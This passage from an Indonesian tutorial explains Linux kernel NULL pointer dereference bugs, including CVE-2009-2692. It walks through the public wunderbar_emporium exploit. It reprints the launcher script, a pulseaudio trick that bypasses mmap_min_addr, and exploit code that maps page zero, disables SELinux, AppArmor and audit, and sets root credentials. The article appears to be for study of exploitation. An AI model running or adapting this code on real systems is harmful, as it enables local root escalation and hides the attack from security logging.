+oleh compiler, dalam hal ini gcc. gcc melakukan optimisasi terhadap kode pada
+driver tun dengan menganggap bahwa pengecekan pada kode tersebut terhadap null
+pointer dereference tidak diperlukan. Berikut ini contoh kodenya (hasil patch
+dari Herbert Xu untuk tun_chr_poll ya dimasukan ke kernel 2.6.30):
+
+# cat drivers/net/tun.c
+
+...
+ 485 static unsigned int tun_chr_poll(struct file *file, poll_table * wait)
+
+ 486 {
+ 487        struct tun_file *tfile = file->private_data;
+ 488        struct tun_struct *tun = __tun_get(tfile);
+ 489        struct sock *sk = tun->sk;
+ 490        unsigned int mask = 0;
+ 491
+ 492        if (!tun)
+ 493                return POLLERR;
+ 494
+ 495        DBG(KERN_INFO "%s: tun_chr_poll\n", tun->dev->name);
+ 496
+ 497        poll_wait(file, &tun->socket.wait, wait);
+ 498
+ 499        if (!skb_queue_empty(&tun->readq))
+ 500                mask |= POLLIN | POLLRDNORM;
+ 501
+ 502        if (sock_writeable(sk) ||
+ 503            (!test_and_set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags) \
+ 504             && sock_writeable(sk)))
+ 505                mask |= POLLOUT | POLLWRNORM;
+ 506
+ 507        if (tun->dev->reg_state != NETREG_REGISTERED)
+ 508                mask = POLLERR;
+ 509
+ 510        tun_put(tun);
+ 511        return mask;
+ 512 }
+...
+
+Pada baris 489 variable pointer sk di-definisikan sekaligus di inisialisasikan
+dengan tun->sk, variable pointer tun sendiri didefinisikan sekaligus di
+insisialisasikan dengan nilai dari fungsi __tun_get (baris 488) dengan input
+dari tfile. Pada baris 492 dilakukan pengecekan terhadap variable pointer tun
+apakah bernilai NULL. Jika memang NULL, maka tun_chr_poll tidak akan dilanjutkan
+dan keluar dari fungsi tersebut. Dalam hal ini, source kode diatas tidak
+bermasalah dengan NULL ptr dereference. 
+
+Namun pada saat di-compile, gcc melakukan optimisasi dan menghilangkan bagian
+pengecekan dibaris 492 tersebut, alasannya karena pada baris 489 variable
+pointer tun telah di-dereference sehingga sudah pasti nilainya tidak NULL, jadi
+pengecekan dihapus untuk menjadikan hasil compile lebih optimum. Hasilnya? tentu
+saja jika tun bernilai NULL maka tidak akan ada pengecekan dan fungsi diatas
+beresiko terkena bug NULL pointer dereference.
+
+Permasalahan ini kemudian menjadi salah satu topik yang didiskusikan diantara
+para developer sehingga mereka kemudian sepakat untuk menghilangkan opsi
+optimisasi terhadap null pointer ketika melakukan kompilasi kernel. Patch pun
+di-merge untuk kode diatas[11].
+
+Bug tun inilah yang kemudian digunakan oleh spender untuk di-eksploitasi
+menggunakan cheddar_bay. Eksploit cheddar_bay ternyata menguak beberapa trik
+eksploitasi null ptr dereference yang mungkin selama ini menjadi rahasia
+underground. At least, itu adalah klaim Brad Spander seperti yang tertulis
+lengkap pada source kode cheddar_bay. Cheddar_bay juga memasukan feature untuk
+men-non aktifkan beragam LSM yang mungkin diaktifkan oleh target (AppArmor,
+Auditing, LSM).
+
+Namun secara khusus kita bisa mengatakan bahwa cheddar_bay menyerang
+implementasi SELinux yang seharusnya menjadi pelindung kernel terhadap serangan
+eksploit. Spender membuktikan dengan cheddar_bay bahwa mengaktifkan SELinux
+justru malah menambah resiko serangan terhadap bug null pointer dereference
+menjadi lebih besar. Belakangan Dan Walsh[12] juga ikut menambahkan kegagalan
+SELinux dalam hal melindungi kernel linux terhadap serangan eksploit. Hal ini
+juga dibenarkan oleh pihak pengembang SELinux bahwa sebenarnya SELinux sangat
+kuat terhadap serangan 'remote-eksploit', namun ternyata lemah terhadap serangan
+'local-eksploit'. Berarti jika suatu sistem merupakan webserver / hosting yang
+mengaktifkan SELinux, dan salah satu web pada hosting tersebut memiliki hole
+(misal: SQL Injection) sehingga penyerang berhasil mendapatkan akses shell (user
+biasa), penyerang tersebut memiliki kesempatan lebih besar untuk mendapatkan
+akses root dengan melakukan eksploitasi terhadap null ptr dereference
+dibandingkan sistem lain yang tidak mengaktifkan SELinux. SELinux merupakan
+produk yang digunakan oleh RedHat dan fakta ini sangat memalukan. 
+
+Saya tidak akan mengupas secara mendetail eksploit cheddar_bay karena dua
+alasan:
+
+1. Spender telah memberikan penjelasan yang sangat sangat panjang tentang
+eksploit tersebut dalam source kode exploit.c
+
+2. Feature yang di-implementasikan oleh cheddar_bay juga digunakan oleh public
+eksploit kedua, wunderbar_emporium. Sehingga penjelasan umum saya berikan pada
+cheddar_bay, namun penjelasan proses eksploitasi akan dijelaskan secara
+mendetail melalui wunderbar_emporium.
+
+
+===// Wunderbar Emporium \\===
+
+Wunderbar_emporium dirilisi oleh Brad Spander sekitar tanggal 14 Agustus 2009
+(Undergr0und pls CMIIW), eksploit tersebut sebagai respon dari advisories yang
+dirilis oleh Tavis Ormandy dan Julien Tinnes (Google Security Team) kepada
+public. Bug tersebut merupakan NULL pointer dereference yang disebabkan oleh
+"incorrect proto_ops initializations" pada kernel linux (CVE-2009-2692).
+Berdasarkan summary CVE:
+
+"The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not
+initialize all function pointers for socket operations in proto_ops structures,
+which allows local users to trigger a NULL pointer dereference and gain
+privileges by using mmap to map page zero, placing arbitrary kode on this page,
+and then invoking an unavailable operation, as demonstrated by the sendpage
+operation (sock_sendpage function) on a PF_PPPOX socket. "
+
+Pada advisories mereka yang dipublish oleh beberapa mailing-list security[12],
+diberikan juga bagaimana metode untuk men-trigger bug tersebut.
+
+Pembahasan lengkap mengenai bug serta eksploit ini telah dilakukan oleh
+xorl[13], sehingga pembahasan yang saya berikan pada artikel ini sifatnya hanya
+summary, dan yang pasti dalam bahasa Indonesia ;).
+
+Pertama-tama, kita akan melihat bug kernel linux yang dapat mentrigger NULL ptr
+dereference tersebut.
+
+# cat include/linux/net.h
+
+...
+struct proto_ops {
+ 151 int             family;
+ 152 struct module   *owner;
+ 153 int             (*release)   (struct socket *sock);
+ 154 int             (*bind)      (struct socket *sock,
+ 155                               struct sockaddr *myaddr,
+ 156                               int sockaddr_len);
+ 157 int             (*connect)   (struct socket *sock,
+ 158                               struct sockaddr *vaddr,
+ 159                               int sockaddr_len, int flags);
+ 160 int             (*socketpair)(struct socket *sock1,
+ 161                               struct socket *sock2);
+ 162 int             (*accept)    (struct socket *sock,
+ 163                               struct socket *newsock, int flags);
+ 164 int             (*getname)   (struct socket *sock,
+ 165                               struct sockaddr *addr,
+ 166                               int *sockaddr_len, int peer);
+ 167 unsigned int    (*poll)      (struct file *file, struct socket *sock,
+ 168                               struct poll_table_struct *wait);
+ ...
+
+Pada Linux setiap socket memiliki asosiasi dengan suatu struktur yang disebut
+proto_ops. Struktur tersebut memiliki variable pointer yang menunjuk suatu
+fungsi operasi tertentu. Misalnya kita membuka koneksi socket internet, maka
+telah tersedia beberapa fungsi untuk operasi pada socket internet (seperti
+connect(), accept(), bind(), dll) tersebut. Nah fungsi-fungsi inilah yang
+ditunjuk oleh variable pointer struktur sock_ops diatas.
+
+Seluruh socket akan diberikan struktur diatas, sehingga muncul pertanyaan
+bagaimana seandainya ada socket yang tidak mengimplementasikan satu atau
+beberapa operasi dari struktur proto_ops?!Misalnya, saya mendesign
+cyberheb_socket() untuk diintegrasikan dalam Linux namun tidak ingin
+mengimplementasikan fungsi accept(). Jika hal tersebut terjadi maka
+cyberheb_socket() diharapkan untuk melakukan inisialisasi terhadap variable
+pointer *accept ke suatu fungsi, misalnya sock_no_accept().
+
+Sebetulnya hal ini tidak akan menjadi masalah karena biasanya implementasi suatu
+socket telah melakukan pengecekan tersendiri. Taviso dan Julien mengambil contoh
+sock_splice_read,
+
+# cat net/socket.c
+
+...
+ 742 static ssize_t sock_splice_read(struct file *file, loff_t *ppos,
+ 743                                struct pipe_inode_info *pipe, size_t len,
+ 744                                unsigned int flags)
+ 745 {
+ 746        struct socket *sock = file->private_data;
+ 747
+ 748        if (unlikely(!sock->ops->splice_read))
+ 749                return -EINVAL;
+ 750
+ 751        return sock->ops->splice_read(sock, ppos, pipe, len, flags);
+ 752 }
+...
+
+Kita bisa lihat bahwa sesaat setelah socket di-inisialisasikan (baris 746),
+makan pada baris berikut nya (baris 748) dilakukan pengecekan terhadap NULL
+pointer dereference. Jika sock adalah NULL maka fungsi sock_splice_read() diatas
+akan langsung mengembalikan nilai error. Ini adalah salah satu contoh
+implementasi yang baik dan sesuai aturan.
+
+Namun ternyata taviso dan jullien menemukan fakta bahwa ada implementasi socket
+yang tidak melakukan pengecekan terhadap NULL pointer dereference sebelum
+melakukan dereference, yaitu pada implementasi sock_sendpage().
+
+# cat net/socket.c
+
+...
+ 727 static ssize_t sock_sendpage(struct file *file, struct page *page,
+ 728                             int offset, size_t size, loff_t *ppos, 
+                                 int more)
+ 729 {
+ 730        struct socket *sock;
+ 731        int flags;
+ 732
+ 733        sock = file->private_data;
+ 734
+ 735        flags = !(file->f_flags & O_NONBLOCK) ? 0 : MSG_DONTWAIT;
+ 736        if (more)
+ 737                flags |= MSG_MORE;
+ 738
+ 739        return sock->ops->sendpage(sock, page, offset, size, flags);
+ 740 }
+...
+
+Bisa kita lihat dengan jelas bahwa sock di-inisialisasikan dengan nilai dari
+private_data (baris 733), dan kemudian tanpa proses pengecekan apakah sock
+bernilai NULL fungsi tersebut langsung melakukan dereference di bagian akhir
+(baris 739). 
+
+Berdasarkan advisories tersebut beberapa contoh implementasi lain juga memiliki
+masalah yang sama diantaranya pada protocol PF_BLUETOOTH, PF_IUCV, PF_PPPOX,
+dll. Advisories mereka juga dilengkapi dengan metode untuk men-trigger bug
+tersebut:
+
+/* ... */
+    int fdin = mkstemp(template);
+    int fdout = socket(PF_PPPOX, SOCK_DGRAM, 0);
+
+    unlink(template);
+
+    ftruncate(fdin, PAGE_SIZE);
+
+    sendfile(fdout, fdin, NULL, PAGE_SIZE);
+/* ... */ 
+
+Advisories yang lengkap walaupun tidak menyertakan eksploit. Namun bagi para
+eksploit writter hal tersebut sudah cukup. Dan hal yang mungkin paling
+menyenangkan adalah statement berikut ini:
+
+"This issue is easily eksploitable for local privilege escalation. In order to
+eksploit this, an attacker would create a mapping at address zero containing
+kode to be executed with privileges of the kernel, and then trigger a
+vulnerable operation".
+
+Sempurna.
+
+Bug tersebut terjadi pada proses kernel, sehingga privilege nya merupakan "ring
+0" (masih ingat dengan cerita alokasi memory diatas?! itulah gunanya mengikuti
+cerita artikel ini dari awal hingga akhir ;) ). Jika kita bisa mengarahkan
+eksekusi processor dengan privilege "ring 0" dan mengontrolnya maka tidak ada
+yang tidak bisa kita lakukan.
+
+Berikut ini step-by-step gambaran umum eksploit wunderbar_emporium:
+
+1. Melakukan pengecakan apakah sistem target merupakan 32-bit ataupun 64-bit.
+Eksploit ini portable sehingga bisa dilakukan pada target 32-bit ataupun 64-bit
+(intel).
+
+2. Melakukan pengecekan terhadap mmap_min_addr restriction. Cara paling mudah
+yang bisa dilakukan oleh user process biasa adalah melihat isi file
+/proc/sys/vm/mmap_min_addr. Jika mmap_min_addr bernilai lebih besar dari nol,
+maka proses eksploitasi akan dilanjutkan dengan trik bypass mmap_min_addr, namun
+jika bernilai nol atau file tersebut tidak ada (versi kernel 2.6 yang lama) maka
+akan dilakukan proses eksploitasi.
+
+Pada wunderbar_emporium2 juga ditambahkan pengecekan apakah terdapat SELinux
+(/selinux/enforce), jika terdapat SELinux maka akan dimanfaatkan untuk bypass
+mmap_min_addr karena ternyata secara default policy SELinux malah justru dapat
+mem-bypass mmap_min_addr melalui trik unconfined_t seperti yang digambarkan oleh
+Dan Walsh.
+
+3. Proses bypass mmap_min_addr (tanpa SELinux) menggunakan trik pulseaudio. File
+exploit.c akan di-compile sebagai shared-object (.so) yang dapat di-load sebagai
+library oleh pulseaudio (dengan options "-L"). Proses ini terlebih dahulu
+melakukan set personality menjadi SVr4, sehingga ketika dijalankan maka
+pulseaudio akan secara otomatis melakukan mapping page 0.
+
+4. Proses eksploitasi akan dilakukan oleh exploit.c, page 0 akan di-set dengan
+suatu fungsi yang menjalankan beberapa procedure. Diantara procedure-procedure
+tersebut adalah men-disable feature-feature LSM (AppArmor, Audit, SELinux).
+Proses ini menggunakan trik 'patching' dari symbol kernel yang telah didapatkan
+sebelumnya. Kenapa bisa di-disable?!tentu saja karena pada tahap ini kita telah
+mendapatkan "ring 0" sehingga seakan-akan procedure ini dilakukan dengan
+privilege kernel.
+
+5. Trigger NULL pointer dereference pada kernel sehingga eksekusi akan dibawa ke
+zero page.
+
+6. Ubah status uid menjadi root.
+
+7. Bangkitkan shell dengan uid root.
+
+8. r00tshell
+
+eksploit wunderbar emporium juga mengemas suatu file movie yang digunakan oleh
+spender untuk 'keren-keren an' :). Namun pada bahasan kita, saya akan membuang
+bagian movie tersebut karena tidak dibutuhkan. Eksploit ini bisa didownload dari
+sini[14].
+
+Wunder emporium terdiri dari 3 files: wunder_emporium.sh, pwnkernel.c,
+exploit.c, kita cukup menjalankan wunder_emporium.sh dan sisanya akan dijalankan
+oleh script tersebut. Berikut ini isi shell script tersebut:
+
+$ cat wunder_emporium.sh
+...
+07 killall -9 pulseaudio 2> /dev/null
+08 IS_64=`uname -p`
+09 OPT_FLAG=""
+10 if [ "$IS_64" = "x86_64" ]; then
+11   OPT_FLAG="-m64"
+12 fi
+13 MINADDR=`cat /proc/sys/vm/mmap_min_addr 2> /dev/null`
+14 if [ "$MINADDR" = "" -o "$MINADDR" = "0" ]; then
+15     cc -fno-stack-protector $OPT_FLAG -o eksploit exploit.c 2> /dev/null
+16     if [ "$?" = "1" ]; then
+17        cc $OPT_FLAG -o eksploit exploit.c
+18     fi
+19     cat tzameti.avi >> ./eksploit
+20     ./eksploit
+21 elif [ ! -f '/selinux/enforce' ]; then
+22     cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o eksploit.so exploit.c
+23     cc $OPT_FLAG -o pwnkernel pwnkernel.c
+24   ./pwnkernel
+25 else
+26     cc -fno-stack-protector $OPT_FLAG -o eksploit exploit.c
+27    cat tzameti.avi >> ./eksploit
+28    ./eksploit
+29    if [ "$?" = "1" ]; then
+30      runcon -t initrc_t ./eksploit
+31      if [ "$?" = "1" ]; then
+32        runcon -t wine_t ./eksploit
+33        if [ "$?" = "1" ]; then
+34          runcon -t vbetool_t ./eksploit
+35          if [ "$?" = "1" ]; then
+36            runcon -t unconfined_mono_t ./eksploit
+37            if [ "$?" = "1" ]; then
+38        runcon -t samba_unconfined_net_t ./eksploit
+39        fi
+40      fi
+41    fi
+42      fi
+43    fi
+44 fi
+
+Script ini melakukan automatisasi proses eksploit, dan tidak ada yang istimewa
+karena sudah jelas dari script nya. Jika tidak ada perlindungan mmap_min_addr
+maka akan segera dilakukan eksploitasi menggunakan hasil compile file exploit.c,
+namun jika terdapat restriction mmap_min_addr akan dilihat kembali apakah
+SELinux diaktifkan dan Enforcing, jika tidak maka dijalankan pwnkernel.c (trik
+personality + pulseaudio), namun jika terdapat SELinux dan Enforcing maka sesuai
+blog Dan Walsh akan digunakan trik unconfined_t user yang memanfaatkan runcon
+untuk mengubah context process (bruteforce) ke initrc_t, wine_t, vbetool_t,
+unconfined_mono_t atau samba_unconfined_net_t. Trik ini bisa dilihat mulai dari
+baris 26 sampai baris 44.
+
+Berikutnya kita akan melihat isi file kernel.c yang mengimplementasikan trik
+personality+pulseaudio.
+
+$ cat pwnkernel.c
+
+/* pwnkernel.c, part of wunderbar_emporium */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/personality.h>
+#include <sys/stat.h>
+
+#define PULSEAUDIO_PATH "/usr/bin/pulseaudio"
+/* pada wunderbar_emporium.sh file exploit.c telah di-compile sebagai 
+   shared object dan digunakan disini sebagai eksploit.so */
+#define PATH_TO_eksploit
+"/home/cyberheb/public_eksploit/wunderbar_emporium/eksploit.so"
+
+int main(void)
+{
+	int ret;
+	struct stat fstat;
+
+	ret = personality(PER_SVR4);
+
+	if (ret == -1) {
+		fprintf(stderr, "Unable to set personality!\n");
+		return 0;
+	}
+
+	fprintf(stdout, " [+] Personality set to: PER_SVR4\n");
+
+	if (stat(PULSEAUDIO_PATH, &fstat)) {
+		fprintf(stderr, "Pulseaudio does not exist!\n");
+		return 0;
+	}
+
+	if (!(fstat.st_mode & S_ISUID) || fstat.st_uid != 0) {
+		fprintf(stderr, "Pulseaudio is not suid root!\n");
+		return 0;
+	}
+	
+	execl(PULSEAUDIO_PATH, PULSEAUDIO_PATH, "--log-level=0", "-L", \
+              PATH_TO_eksploit, NULL);
+
+	return 0;
+}
+
+Cukup simple dan tidak perlu panjang lebar, pwnkernel akan melakukan setting
+personality menjadi SVr4 (PER_SVR4) dan kemudian menjalankan pulseaudio dengan
+terlebih dahulu melakukan pemeriksaan apakah pulseaudio merupakan binary dengan
+suid root. Sisanya tinggal mengeksekusi pulseaudio dengan mendefinisikan
+exploit.so sebagai library untuk di-load. Pada tahap ini page 0 akan di map
+read-only secara otomatis dan eksekusi selanjutnya akan ditangani oleh kode
+didalam eksploit.so.
+
+Tentu saja bagian yang paling menarik adalah exploit.c, disinilah terdapat
+kode-kode untuk melakukan patching LSM, mendapatkan akses root, dsb. Seperti
+yang telah disampaikan sebelumnya, saya akan membuang bagian video untuk
+keren-kerenan nya. Dan berhubung exploit.c adalah inti eksploitnya maka akan
+dibahas per-fungsi :).
+
+...
+void pa__done(void *m)
+{
+	return;
+}
+
+int main(void)
+{
+  called_from_main = 1;
+  pa__init(NULL);
+}
+...
+
+Sebgaimana biasanya, eksploit akan mulai dari fungsi main(). Fungsi main() hanya
+terdapat 2 baris, yang pertama adalah melakukan set variable called_from_main,
+jika bernilai 1 maka video tzameti.avi akan dimainkan sesaat sebelum mendapatkan
+shell root, jika bernilai 0 maka video tidak akan dimainkan.
+
+Selanjutnya akan dijalankan fungsi pa__init(NULL), mungkin ada yang bertanya
+mengapa memilih nama pa__init() ataupun terdapat fungsi pa__done() pada
+exploit.c?! jangan lupa, pada salah satu trik bypass mmap_min_addr exploit.c
+akan di-compile sebagai shared object dan diload sebagai library oleh
+pulseaudio, dalam hal ini program utama pulseaudio akan mencari fungsi
+pa__init() dan pa__end() saat menjalankan library tersebut. Itu sebabnya fungsi
+utama dalam exploit.c akan dimasukan dalam pa__init().
+
+Sekarang mari kita lihat apa isi dari fungsi pa_init().
+
+int pa__init(void *m)
+{
+	char *mem = NULL;
+	int d;
+	int ret;
+
+	our_uid = getuid();
+
+	if ((personality(0xffffffff)) != PER_SVR4) {
+		mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, 
+			   MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+		if (mem != NULL) {
+			/* for old kernels with SELinux that don't allow RWX 
+                           anonymous mappings
+			   luckily they don't have NX support either ;) */
+			mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+				   MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0,
+				   0);
+			if (mem != NULL) {
+				fprintf(stdout, "UNABLE TO MAP ZERO PAGE!\n");
+				return 1;
+			}
+		}
+	} else {
+		ret = mprotect(NULL, 0x1000, PROT_READ | PROT_WRITE | \ 
+                                             PROT_EXEC);
+		if (ret == -1) {
+			fprintf(stdout, "UNABLE TO MPROTECT ZERO PAGE!\n");
+			return 1;
+		}
+	}
+
+	fprintf(stdout, " [+] MAPPED ZERO PAGE!\n");
+
+Tampak tidak asing?! ;p. Yup, uid proses saat ini akan dimasukan kedalam
+variable our_uid, dan selanjutnya dilakukan pengecekan terhadap personality.
+Jika personality process saat ini bukan SVr4 (page zero belum di-mapped), maka
+akan dilakukan mapping secara manual. Kita bisa sampai pada bagian ini biasanya
+karena kernel user tidak ada restriction mmap_min_addr, mmap_min_addr di-set
+bernilai '0', atau restriction mmap_min_addr telah berhasil di-bypass.
+
+Kernel lama yang menggunakan SELinux menggunakan pembatasan terhadap page 0
+dengan tidak mengijinkan mapping RWX (Read+Write+Execute), dalam hal ini
+bypass-nya cukup dengan mengganti protocol untuk mapping di page 0 menjadi
+(Read+Write).
+
+Jika personality sudah di-set SVr4 yang berarti page 0 telah di-mapped (Read),
+maka tinggal mengganti hak aksesnya menggunakan syscall mprotect() agar menjadi
+(Read+Write+Execute).
+
+Proses selanjutnya adalah mendapatkan lokasi modul-modul LSM yang diaktifkan,
+
+...
+selinux_enforcing = (int *)get_kernel_sym("selinux_enforcing");
+selinux_enabled = (int *)get_kernel_sym("selinux_enabled");
+apparmor_enabled = (int *)get_kernel_sym("apparmor_enabled");
+apparmor_complain = (int *)get_kernel_sym("apparmor_complain");
+apparmor_audit = (int *)get_kernel_sym("apparmor_audit");
+apparmor_logsyscall = (int *)get_kernel_sym("apparmor_logsyscall");
+security_ops = (unsigned long *)get_kernel_sym("security_ops");
+default_security_ops = get_kernel_sym("default_security_ops");
+sel_read_enforce = get_kernel_sym("sel_read_enforce");
+audit_enabled = (int *)get_kernel_sym("audit_enabled");
+
+commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
+prepare_kernel_cred =
+(_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");
+...
+
+Ketika kernel mengaktifkan suatu modul security (LSM), maka modul tersebut akan
+diload ke suatu lokasi memory dan lokasi tersebut akan disimpan pada suatu file
+(/proc/kallsyms atau /proc/ksyms). Proses berikutnya dari exploit.c adalah
+mendapatkan lokasi LSM tersebut pada memory, hal ini dilakukan oleh fungsi
+get_kernel_sym() yang definisinya berikut ini:
+
+...
+static unsigned long get_kernel_sym(char *name)
+{
+	FILE *f;
+	unsigned long addr;
+	char dummy;
+	char sname[256];
+	int ret;
+
+	f = fopen("/proc/kallsyms", "r");
+	if (f == NULL) {
+		f = fopen("/proc/ksyms", "r");
+		if (f == NULL) {
+			fprintf(stdout, "Unable to obtain symbol listing!\n");
+			return 0;
+		}
+	}
+
+	ret = 0;
+	while(ret != EOF) {
+		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
+		if (ret == 0) {
+			fscanf(f, "%s\n", sname);
+			continue;
+		}
+		if (!strcmp(name, sname)) {
+			fprintf(stdout, " [+] Resolved %s to %p\n", name, 
+			                  (void *)addr);
+			fclose(f);
+			return addr;
+		}
+	}
+
+	fclose(f);
+	return 0;
+}
+...
+
+Fungsi ini akan membaca isi dari file /proc/kallsyms atau /proc/ksyms dan
+mencari lokasi berdasarkan pattern yang diinginkan. Saya rasa sudah sangat jelas
+inti dari kode diatas.
+
+...
+	mem[0] = '\xff';
+	mem[1] = '\x25';
+	*(unsigned int *)&mem[2] = (sizeof(unsigned long) != \
+                                    sizeof(unsigned int))? 0 : 6;
+	*(unsigned long *)&mem[6] = (unsigned long)&own_the_kernel;
+...
+
+Bagian selanjutnya adalah menulis page 0 yang telah di-mapped sebelumnya agar
+berisi kode-kode yang kita inginkan. Pada lokasi NULL (Zero Page) dimasukan
+0xff, pada lokasi NULL+1 dimasukan 0x25, dan kemudian jika mesin terget adalah
+32-bit maka NULL+2 akan dimasukan 0 namun jika target adalah komputer 64-bit
+maka NULL+2 akan dimasukan 6. Sisanya NULL+6 akan dimasukan lokasi/alamat dari
+fungsi own_the_kernel().
+
+Untuk yang penasaran dengan proses pengecekan diatas (antara 32-bit dan 64-bit),
+trik ini sangat sederhana. Trik ini membandingkan size tipe data "unsigned long"
+dengan tipe data "unsigned int", pada komputer 32-bit kedua tipe data ini tidak
+memiliki size yang sama namun pada komputer 64-bit kedua tipe data ini memiliki
+size yang sama.
+
+Selanjutnya kita akan melihat bagaimana isi dari fungsi own_the_kernel(), karena
+pada saat NULL pointer dereference terjadi maka eksekusi akan dibawa pada lokasi
+fungsi ini berada.
+
+...
+static int __attribute__((regparm(3))) own_the_kernel(unsigned long a, unsigned 
+long b, unsigned long c, unsigned long d, unsigned long e)
+{
+	got_ring0 = 1;
+
+	if (audit_enabled)
+		*audit_enabled = 0;
+
+	// disable apparmor
+	if (apparmor_enabled && *apparmor_enabled) {
+		what_we_do = 1;
+			*apparmor_enabled = 0;
+		if (apparmor_audit)
+			*apparmor_audit = 0;
+		if (apparmor_logsyscall)
+			*apparmor_logsyscall = 0;
+		if (apparmor_complain)
+			*apparmor_complain = 0;
+	}
+
+	// disable SELinux
+	if (selinux_enforcing && *selinux_enforcing) {
+		what_we_do = 2;
+		*selinux_enforcing = 0;
+	}
+
+	if (!selinux_enabled || selinux_enabled && *selinux_enabled == 0) {
+		// trash LSM
+		if (default_security_ops && security_ops) {
+			if (*security_ops != default_security_ops)
+				what_we_do = 3;
+			*security_ops = default_security_ops;
+		}
+	}
+
+...
+
+Pada saat NULL pointer dereference terjadi pada kernel, maka eksekusi akan
+dibawa menuju fungsi ini dan tentu saja privilege-nya adalah kernel. Maka jika
+eksekusi berhasil mencapai tahap ini kita sudah bisa menyatakan bahwa "ring 0"
+telah didapatkan. Bagian awal dari own_the_kernel() segara melakukan hal ini
+dengan men-set variable "got_ring0" dengan angka 1.
+
+Proses selanjutnya adalah men-disable LSM. Dengan privilege kernel kita dapat
+melakukan hal ini dengan mudah. Seperti yang telah dibahas sebelumnya bahwa
+get_kernel_sysm() akan memberikan lokasi modul-modul security yang diaktifkan,
+sehingga dengan operasi pointer kita dapat segera melakukan 'patching' lokasi
+tersebut agar bernilai 'nol'. Ini salah satunya:
+
+...
+if (audit_enabled)
+	*audit_enabled = 0;
+...
+
+Pada bagian selanjutnya yang cukup menarik adalah proses patching SELinux:
+
+...
+/* make the idiots think selinux is enforcing */
+if (sel_read_enforce) {
+	unsigned char *p;
+	unsigned long _cr0;
+
+	asm volatile (
+	"mov %%cr0, %0"
+	: "=r" (_cr0)
+	);
+	_cr0 &= ~0x10000;
+	asm volatile (
+	"mov %0, %%cr0"
+	:
+	: "r" (_cr0)
+	);
+	if (sizeof(unsigned int) != sizeof(unsigned long)) {
+		/* 64bit version, look for the mov ecx, [rip+off] 
+                    and replace with mov ecx, 1
+		*/
+		for (p = (unsigned char *)sel_read_enforce; \
+                    (unsigned long)p < (sel_read_enforce + 0x30); p++) 
+		        {
+			   if (p[0] == 0x8b && p[1] == 0x0d) {
+				p[0] = '\xb9';
+				p[5] = '\x90';
+				*(unsigned int *)&p[1] = 1;
+			}
+		}
+	} else {
+		/* 32bit, replace push [selinux_enforcing] with push 1 * */
+		for (p = (unsigned char *)sel_read_enforce; \
+                    (unsigned long)p < (sel_read_enforce + 0x20); \
+                                                            p++) {
+			if (p[0] == 0xff && p[1] == 0x35) {
+				// while we're at it, disable 
+				// SELinux without having a 
+				// symbol for selinux_enforcing ;)
+				if (!selinux_enforcing) {
+					sel_enforce_ptr = \
+                                                  *(unsigned int **)&p[2];
+					*sel_enforce_ptr = 0;
+					what_we_do = 2;
+				}
+				p[0] = '\x68';
+				p[5] = '\x90';
+				*(unsigned int *)&p[1] = 1;
+			}
+		}
+	}
+	_cr0 |= 0x10000;
+	asm volatile (
+	"mov %0, %%cr0"
+	:
+	: "r" (_cr0)
+	);
+}
+...
+
+kode diatas digunakan untuk melakukan patching pada sel_read_enforce. Patching
+ini seperti layaknya proses patching sebelumnya ataupun proses patching ketika
+kita hendak mengcrack suatu program dimana patch dilakukan secara langsung pada
+memory. Pada komputer 32-bit akan dicari posisi kode "push [selinux_enforcing]"
+dan menggantinya dengan "push 1". Posisi kode tersebut dicari mulai dari lokasi
+yang didefinisikan oleh *sel_read_enforce (dari symbol kernel) hingga (+0x20)
+pada memory. Hal yang sama dilakukan untuk komputer 64-bit. Penjelasan pada kode
+tersebut sangat jelas. Sekali lagi, patching apapun mungkin jika sudah
+mendapatkan "ring 0".
+
+Bagian selanjutnya adalah "gimme r00t". Fungsi ini sangat umum digunakan pada
+local eksploit Linux, dalam eksploit spender kali ini disebut sebagai fungsi
+give_it_to_me_any_way_you_can().
+
+...
+static void give_it_to_me_any_way_you_can(void)
+{
+	if (commit_creds && prepare_kernel_cred) {
+		commit_creds(prepare_kernel_cred(0));
+		got_root = 1;
+	}
+...
+
+Ini adalah tehnik variasi dari "gimme r00t". Pada kernel linux yang dirilis
+akhir-akhir ini terdapat fungsi untuk melakukan set credential secara langsung,
+berikut ini definisinya:
+
+# cat include/linux/cred.h
+...
+ 150 extern int commit_creds(struct cred *);
+...
+
+dan berikut ini implementasinya:
+
+# cat kernel/cred.c
+
+...
+ 341 /**
+ 342 * commit_creds - Install new credentials upon the current task
+ 343 * @new: The credentials to be assigned
+ 344 *
+ 345 * Install a new set of credentials to the current task, using RCU to
+replace
+ 346 * the old set.  Both the objective and the subjective credentials pointers
+are
+ 347 * updated.  This function may not be called if the subjective credentials
+are
+ 348 * in an overridden state.
+ 349 *
+ 350 * This function eats the caller's reference to the new credentials.
+ 351 *
+ 352 * Always returns 0 thus allowing this function to be tail-called at the end
+ 353 * of, say, sys_setgid().
+ 354 */
+ 355 int commit_creds(struct cred *new)
+ 356 {
+ 357        struct task_struct *task = current;
+ 358        const struct cred *old;
+ 359
+ 360        BUG_ON(task->cred != task->real_cred);
+ 361        BUG_ON(atomic_read(&task->real_cred->usage) < 2);
+ 362        BUG_ON(atomic_read(&new->usage) < 1);
+ 363
+ 364        old = task->real_cred;
+ 365        security_commit_creds(new, old);
+ 366
+ 367        get_cred(new); /* we will require a ref for the subj creds too */
+ 368
+ 369        /* dumpability changes */
+ 370        if (old->euid != new->euid ||
+ 371            old->egid != new->egid ||
+ 372            old->fsuid != new->fsuid ||
+ 373            old->fsgid != new->fsgid ||
+ 374            !cap_issubset(new->cap_permitted, old->cap_permitted)) {
+ 375                if (task->mm)
+ 376                        set_dumpable(task->mm, suid_dumpable);
+ 377                task->pdeath_signal = 0;
+ 378                smp_wmb();
+ 379        }
+...
+ 420 EXPORT_SYMBOL(commit_creds);
+
+commit_creds merupakan fungsi yang di-export sebagai symbol kedalam kernel
